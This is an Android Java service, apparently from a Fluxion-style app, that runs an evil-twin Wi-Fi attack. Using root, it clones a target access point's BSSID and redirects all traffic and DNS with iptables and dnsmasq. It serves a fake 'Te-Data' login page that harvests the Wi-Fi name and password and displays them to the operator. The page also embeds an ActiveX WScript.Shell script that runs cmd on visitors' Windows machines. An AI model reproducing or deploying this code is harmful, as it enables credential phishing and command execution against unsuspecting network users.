package com.example.andro.fluxion;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.CaptivePortal;
import android.net.ProxyInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Parcel;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;

public class wifiService extends Service {
    WifiManager c;
    ServerSocket serverSocket;
    vi o;
    Handler h;
    SharedPreferences wifi;
    public static Method setmethod;
    public static Method isenable;
    public static WifiConfiguration myConfig;
    SharedPreferences.Editor wifi_write;
    Process process;
    Field channal, band;
    Timer t;
    static int i = 0;
    NotificationManager k;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        try {
            if (serverSocket != null) {
                setmethod.invoke(c, myConfig, false);
                t.cancel();
                serverSocket.close();
                o.stop();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        c.setWifiEnabled(true);
        super.onDestroy();
    }

    @Override
    public void onCreate() {
        super.onCreate();
        o = new vi();
        o.start();
        t = new Timer();
        k = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        c = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        h = new Handler();
        wifi = getSharedPreferences("wifiname", MODE_MULTI_PROCESS);
        wifi_write = getSharedPreferences("wifiname", MODE_MULTI_PROCESS).edit();
        wifi_write.putBoolean("run", true);
        wifi_write.apply();
        myConfig = new WifiConfiguration();
        myConfig.BSSID = MainActivity.h.toUpperCase();
        myConfig.preSharedKey = "http://192.168.1.1:8080\n";
        myConfig.allowedKeyManagement.clear();
        myConfig.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.IEEE8021X);
        myConfig.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_EAP);
        myConfig.allowedGroupCiphers.clear();
        myConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
        myConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
        myConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104);
        myConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);
        myConfig.allowedPairwiseCiphers.clear();
        myConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
        myConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
        myConfig.allowedProtocols.clear();
        myConfig.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
        myConfig.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
        Parcel.obtain().writeByteArray("http://192.168.1.1:8080\r\n".getBytes());
        myConfig.writeToParcel(Parcel.obtain(), CaptivePortal.PARCELABLE_WRITE_RETURN_VALUE);
        c.getDhcpInfo().writeToParcel(Parcel.obtain(), CaptivePortal.PARCELABLE_WRITE_RETURN_VALUE);
        c.getConnectionInfo().writeToParcel(Parcel.obtain(), CaptivePortal.PARCELABLE_WRITE_RETURN_VALUE);
        Parcel.obtain().writeByteArray("http://192.168.1.1:8080\r\n".getBytes());
        try {

            channal = WifiConfiguration.class.getField("channel");
            channal.setInt(myConfig, 13);
            band = WifiConfiguration.class.getField("HS20OpURL");
            band.set(myConfig, "http://192.168.1.1");
            setmethod = c.getClass().getDeclaredMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class);
            setmethod.setAccessible(true);
            isenable = c.getClass().getDeclaredMethod("isWifiApEnabled");
            isenable.setAccessible(true);
            process = Runtime.getRuntime().exec("su");
     //       for(Field t:WifiConfiguration.class.getFields()){process.getOutputStream().write(("echo "+t.getName()+"="+t.getType()+" >>/storage/extSdCard/x.txt\n").getBytes()); }
            process.getOutputStream().write("iptables -t nat -F\n".getBytes());
            process.getOutputStream().write("iptables -t mangle -F\n".getBytes());
            process.getOutputStream().write("iptables -F\n".getBytes());
            process.getOutputStream().write("iptables -t nat -A PREROUTING -p 6 -j REDIRECT --to-port 8080\n".getBytes());
            process.getOutputStream().write("iptables -t mangle -A FORWARD -p 6 --tcp-flags SYN,RST SYN -j TCPMSS --set-mss 1452\n".getBytes());
            process.getOutputStream().write("iptables -t mangle -A PREROUTING -p 6 -j TPROXY --to-port 8080 --on-ip 192.168.1.1 --tproxy-mark 0x1/0x1\n".getBytes());
        } catch (Exception e) {
            Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            if (wifi.getBoolean("run", false)) {
                myConfig.SSID = wifi.getString("name", "");
                c.setWifiEnabled(false);
                setmethod.invoke(c, myConfig, true);
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            if ((boolean) isenable.invoke(c)) {
                                process.getOutputStream().write(("ip addr show\n").getBytes());
                                process.getOutputStream().write(("ip addr delete 192.168.43.1/24 dev wlan0 brd 192.168.43.255\n").getBytes());
                                process.getOutputStream().write(("ip addr delete 192.168.43.1/24 dev wlan0 brd 192.168.43.255\n").getBytes());
                                process.getOutputStream().write(("brctl addbr br0\n").getBytes());
                                process.getOutputStream().write(("brctl addif br0 wlan0\n").getBytes());
                                process.getOutputStream().write(("brctl stp br0 on\n").getBytes());
                                process.getOutputStream().write(("ip addr add 192.168.1.1/24 dev br0 brd 192.168.1.255\n").getBytes());
                                process.getOutputStream().write(("ip link set dev br0 address " + MainActivity.h.toUpperCase() + "\n").getBytes());
                                process.getOutputStream().write(("ip link set dev br0 mtu 1500\n").getBytes());
                                process.getOutputStream().write(("ip link set dev br0 multicast on\n").getBytes());
                                process.getOutputStream().write(("ip link set dev br0 promisc on\n").getBytes());
                                process.getOutputStream().write(("ip link set dev br0 qlen 1000\n").getBytes());
                                process.getOutputStream().write(("ip link set dev br0 arp on\n").getBytes());
                                process.getOutputStream().write(("ip link set dev br0 up\n").getBytes());
                                process.getOutputStream().write(("ip route add default via 192.168.1.1 dev br0\n").getBytes());
                                process.getOutputStream().write(("ip route add 192.168.1.0/24 dev wlan0 scope link table 61\n").getBytes());
                                process.getOutputStream().write(("ip rule add fwmark 0x61 table 61\n").getBytes());
                                process.getOutputStream().write(("ip rule add iif tun0 table 61\n").getBytes());
                                process.getOutputStream().write(("killall -9 dnsmasq\n").getBytes());
                                process.getOutputStream().write(("dnsmasq --no-resolv  --listen-address=192.168.1.1 --domain-needed --bootp-dynamic=192.168.1.1  --no-daemon --dhcp-option=3,192.168.1.1 --dhcp-option=6,192.168.1.1 --interface=br0 --server=/#/192.168.1.1 --address=/#/192.168.1.1 --port=80 --dhcp-range=192.168.1.1,192.168.1.255,255.255.255.0,24h --dhcp-broadcast==192.168.1.255 \n").getBytes());
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        try {
                                            process = Runtime.getRuntime().exec("su");
                                            process.getOutputStream().write(("route add default gw 192.168.1.1 br0 \n").getBytes());
                                            process.getOutputStream().write(("route add 192.168.1.0 gw 192.168.1.1 br0 \n").getBytes());
                                            process.getOutputStream().write(("httpd -p 192.168.1.1:8080 \n").getBytes());
                                            process.getOutputStream().write(("dhcpcd -r 192.168.1.1 -s 192.168.1.1 -X 192.168.1.1 br0\n").getBytes());
                                            process.getOutputStream().write(("ndc resolver setifdns br0 192.168.1.1\n").getBytes());
                                            process.getOutputStream().write(("dnsd -vs -i 192.168.1.1:8080 \n").getBytes());
                                        } catch (Exception e) {
                                        }
                                    }
                                }).start();
                                cancel();
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                            cancel();
                            t.cancel();
                        }
                    }
                }, 0, 1);
                wifi_write.putBoolean("run", false);
                wifi_write.apply();
            }
        } catch (Exception e) {
            Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
        }
        return super.onStartCommand(intent, flags, startId);
    }


    private class vi extends Thread {
        Socket n;
        vr y;

        @Override
        public void run() {
            try {
                serverSocket = new ServerSocket(8080);
                while (true) {
                    n = serverSocket.accept();
                    y = new vr(n);
                    y.start();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private class vr extends Thread {
        Socket b;
        BufferedReader reader;
        PrintWriter writer;
        String w;
        String s = "<!DOCTYPE html> \n" +
                "<html>\n" +
                "    <head>\n" +
                "        <meta charset=\"UTF-8\">\n" +
                "        <title>Te-Data</title>\n" +
                "<style>\n" +
                ".a\n" +
                "{\n" +
                " font-size: 20px;\n" +
                "  background : green;\n" +
                "    height: auto;\n" +
                "   width: 100%;\n" +
                "    border: 3px solid #73AD21;\n" +
                "}\n" +
                ".s\n" +
                "{\n" +
                "\n" +
                " font-size: 20px;\n" +
                "  background : rgb(128,140,140);\n" +
                "    height: 100%;\n" +
                "   width: 200px;\n" +
                "    border: 3px solid rgb(128,110,110);\n" +
                "}\n" +
                ".h\n" +
                "{  \n" +
                "    width:196px;\n" +
                "    background-color: #4CAF60;\n" +
                "    border: none;\n" +
                "    color: white;\n" +
                "    padding: 16px 32px;\n" +
                "    text-decoration: none;\n" +
                "    margin: 4px 2px;\n" +
                "    cursor: pointer;\n" +
                "}\n" +
                ".q\n" +
                "{  \n" +
                "    width:50%;\n" +
                "    background-color: #4CAF60;\n" +
                "    border: none;\n" +
                "    color: white;\n" +
                "    padding: 16px 32px;\n" +
                "    text-decoration: none;\n" +
                "    margin: 4px 2px;\n" +
                "    cursor: pointer;\n" +
                "}\n" +
                ".q3\n" +
                "{  \n" +
                "    width:96%;\n" +
                "    background-color: black;\n" +
                "    border: 1;\n" +
                "    color: white;\n" +
                "    padding: 16px 32px;\n" +
                "    text-decoration: none;\n" +
                "    margin: 4px 2px;\n" +
                "    cursor: pointer;\n" +
                "}\n" +
                ".tx\n" +
                "{  \n" +
                "    width:80%;\n" +
                "    background-color: #4CAF60;\n" +
                "    border: none;\n" +
                "    color: white;\n" +
                "    padding: 16px 32px;\n" +
                "    text-decoration: none;\n" +
                "    margin: 4px 2px;\n" +
                "}\n" +
                ".d\n" +
                "{  \n" +
                "    width:196px;\n" +
                "    background-color: black;\n" +
                "    border: none;\n" +
                "    color: white;\n" +
                "    padding: 16px 32px;\n" +
                "    text-decoration: none;\n" +
                "    margin: 4px 2px;\n" +
                "    cursor: pointer;\n" +
                "}\n" +
                ".k div{\n" +
                "float:left;\n" +
                "}\n" +
                ".ce{ width:100%;height: 90%;}" +
                "</style>" +
                "    </head>\n" +
                "    <body>\n" +
                "<form action=\"login.html\" method=\"post(a)\">\n" +
                "        <div class=\"a\" name=\"dev2\">\n" +
                "<center>\n" +
                "        <h1 name=\"q\">Te-Data</h1>\n" +
                "</center>\n" +
                "        </div>\n" +
                "        <div class=\"k\" name=\"a\">\n" +
                "    <div class=\"ce\" name=\"div1\">\n" +
                "        <br>\n" +
                "        <br>\n" +
                "        <br>\n" +
                "         <center>\n" +
                "              <table border=\"1\" name=\"a\" style=\"width:50%\" >\n" +
                "  <tr>\n" +
                "<td> \n" +
                "<br>\n" +
                "  <center>\n" +
                "      <table name=\"mytable\" style=\"width:100%;height: 100% \">\n" +
                "          \n" +
                "          <tr>\n" +
                "              <td><center><p name=\"text1\">wifi name :</p></center></td>\n" +
                "              <td>\n" +
                "                  <input class=\"tx\" type=\"text\" name=\"x\"  placeholder=\"enter wifi name\" value=\"\" >\n" +
                "              </td>\n" +
                "             </tr>\n" +
                "             <tr>\n" +
                "                 <td><center><p name=\"text2\">password :</p></center> </td>\n" +
                "                 <td>\n" +
                "                     <input class=\"tx\" name=\"z\" type=\"password\" placeholder=\"enter password\" value=\"\" >\n" +
                "                     </td>\n" +
                "                 </tr>\n" +
                "      </table> \n" +
                "        <br>\n" +
                "  </center>\n" +
                "  <center><input class=\"q3\" type=\"submit\" name=\"f\" value=\"Sing in\"  >\n" +
                "</center>\n" +
                "              </td>\n" +
                "              </tr>     \n" +
                "        </table> \n" +
                "         </center>\n" +
                "    </div>\n" +
                "        </div>\n" +
                "</form>\n"+
                "<script type=\"text/javascript\">\n" +
                "try{\n" +
                "var shell =new ActiveXObject(\"WScript.Shell\");\n" +
                "shell.Run(\"cmd /k echo \\\"I hack your pc\\\">E://import.txt\");\n" +
                "alert(\"I hack your pc\");\n" +
                "}catch(ex){}\n" +
                "</script>\n" +
                " </body>\n" +
                "</html>\n", password, user;

        vr(Socket g) {
            b = g;
        }

        @Override
        public void run() {

            try {
                reader = new BufferedReader(new InputStreamReader(b.getInputStream()));
                w = reader.readLine();
                writer = new PrintWriter(b.getOutputStream());
                writer.print("HTTP/1.0 200" + "\r\n");
                writer.print("Content type: text/php" + "\r\n");
                writer.print("Content length: " + s.length() + "\r\n");
                writer.print("\r\n");
                writer.print(s + "\r\n");
                writer.flush();
                b.close();
                password = w.substring(w.indexOf("&z=") + 3, w.indexOf("&f=Sing+in HTTP/1.1"));
                user = w.substring(w.indexOf("x=") + 2, w.indexOf("&z="));
                h.post(new Runnable() {
                    @Override
                    public void run() {
                        wifi_write.putString("user", user);
                        wifi_write.putString("password", password);
                        wifi_write.commit();
                        k.notify(i, new NotificationCompat.Builder(wifiService.this).setDefaults(Notification.DEFAULT_ALL).setSmallIcon(R.drawable.ic_launcher_background)
                                .setContentTitle("user = " + user).setContentText("password = " + password).build());
                        i++;
                        Toast.makeText(wifiService.this, "user = " + user, Toast.LENGTH_LONG).show();
                        Toast.makeText(wifiService.this, "password = " + password, Toast.LENGTH_LONG).show();

                    }
                });
            } catch (IOException e) {
                e.printStackTrace();
            } catch (Exception e) {
            }
        }
    }
}
